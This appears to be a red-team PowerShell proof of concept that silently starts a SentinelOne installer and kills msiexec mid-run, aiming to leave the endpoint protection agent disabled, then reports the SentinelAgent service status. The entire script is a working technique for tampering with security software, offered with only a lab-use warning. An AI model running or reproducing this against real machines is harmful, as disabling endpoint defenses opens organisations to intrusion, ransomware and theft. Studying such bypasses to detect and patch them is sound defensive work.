# Requires administrative privileges
# WARNING: For red team or research in a safe, authorized lab environment only.

# Path to legitimate SentinelOne installer (should match endpoint's agent version)
$installerPath = "C:\Path\To\SentinelInstaller_windows_vXX.X.X.msi"

# Start the installer in a separate process
$process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$installerPath`" /qn" -PassThru
Write-Host "[*] Started installer with PID $($process.Id)"

# Wait a few seconds for the service logic to initialize (tune as needed)
Start-Sleep -Seconds 5

# Kill msiexec to interrupt the process and potentially disable protection
try {
    Stop-Process -Id $process.Id -Force
    Write-Host "[+] Killed msiexec.exe process (PID $($process.Id))"
} catch {
    Write-Warning "[-] Failed to kill msiexec: $_"
}

# Confirm status of SentinelOne service (if it's still running)
$svc = Get-Service -Name "SentinelAgent" -ErrorAction SilentlyContinue
if ($svc) {
    Write-Host "[*] SentinelOne Service status: $($svc.Status)"
} else {
    Write-Host "[!] SentinelOne service not found - it may have been removed or not installed"
}
